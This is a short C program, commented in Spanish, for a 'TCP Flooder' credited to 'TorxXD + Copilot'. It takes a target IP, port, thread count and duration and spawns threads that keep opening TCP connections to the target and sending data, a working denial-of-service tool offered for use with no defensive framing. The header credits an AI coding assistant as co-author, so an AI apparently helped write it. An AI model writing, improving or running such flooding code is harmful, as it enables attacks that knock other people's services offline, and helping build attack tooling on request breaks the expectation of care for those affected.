/*
 * TCP Flooder SIN privilegios root
 * Solo usa sockets normales y conexiones TCP.
 * No manipula cabeceras IP/TCP. No requiere root.
 * Reemplaza el código original que usaba raw sockets.
 * Por TorxXD + Copilot
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int floodPort;
int numThreads;
int duration;

void *flood(void *arg) {
    char *target = (char*)arg;
    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(floodPort);
    server.sin_addr.s_addr = inet_addr(target);

    time_t start = time(NULL);

    while (time(NULL) - start < duration) {
        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) continue;
        connect(sockfd, (struct sockaddr *)&server, sizeof(server));
        // Send some data (optional)
        send(sockfd, "Hello", 5, 0);
        close(sockfd);
        usleep(1000); // Un pequeño delay para evitar saturar el sistema local
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 5) {
        printf("Uso: %s <target IP> <port> <threads> <time>\n", argv[0]);
        return 1;
    }
    char *target = argv[1];
    floodPort = atoi(argv[2]);
    numThreads = atoi(argv[3]);
    duration = atoi(argv[4]);

    pthread_t threads[numThreads];
    for (int i = 0; i < numThreads; ++i) {
        pthread_create(&threads[i], NULL, flood, target);
    }
    for (int i = 0; i < numThreads; ++i) {
        pthread_join(threads[i], NULL);
    }
    printf("Flood finalizado.\n");
    return 0;
}
